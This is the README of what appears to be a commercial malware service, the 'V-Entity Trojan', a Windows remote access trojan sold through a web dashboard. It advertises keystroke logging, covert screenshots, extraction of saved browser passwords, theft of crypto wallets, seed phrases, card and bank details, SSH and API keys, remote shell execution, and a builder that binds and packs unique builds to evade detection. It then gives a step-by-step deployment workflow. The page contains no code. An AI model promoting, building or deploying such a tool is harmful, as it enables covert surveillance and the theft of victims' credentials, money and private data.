# 🧬 V-Entity Trojan

> Custom-compiled Windows remote access agent with per-user dashboard control.

**V-Entity Trojan** is a fully customizable Windows agent — compiled per-deployment with your chosen settings, icon, and target paths. Each build is unique, keeping detection low.

Built and managed entirely from a private web dashboard.

---

## Features

| Capability | Description |
|---|---|
| **Screenshot Capture** | Remote screenshots with zoom, batch select/delete, and fullscreen gallery |
| **Keystroke Logging** | Full keystroke capture with reconstructed readable output |
| **Crypto Wallet Detection** | 100+ wallets — Phantom, MetaMask, Ledger, Trezor, Exodus, seed phrases, private keys |
| **Secret Tracing** | Credit/debit cards, bank accounts, PayPal, Wise, Revolut, Stripe, API keys, SSH keys, 2FA codes |
| **Password Extraction** | Chrome/Edge/Brave saved credentials with one-click copy |
| **Directory Reconstruction** | Full Windows filesystem path rebuilding from raw logs |
| **Remote Command Execution** | Write and execute shell commands, read results live |
| **Email & Domain Extraction** | Finds and categorizes emails from credential data |
| **File Browser** | Browse and download captured files per system |
| **Trojan Builder** | Compile custom agents with preset path groups (browsers, wallets, messaging, auth, databases, cloud, email), binder/host EXE stubbing, compiler options (LLVM/Clang, MinGW, UPX) |
| **Multi-System Dashboard** | Real-time status of all targets from one interface |

---

## How It Works

1. **Create your account** at [v-entity.pro](https://v-entity.pro)
2. **Configure your agent** — choose target paths, capture intervals, icon, and compiler
3. **Download** your custom-compiled executable
4. **Deploy** — the agent collects data and syncs to your dashboard
5. **Monitor** — view screenshots, keystrokes, passwords, wallets, and files from your private dashboard

All settings, captures, and storage are isolated per user.
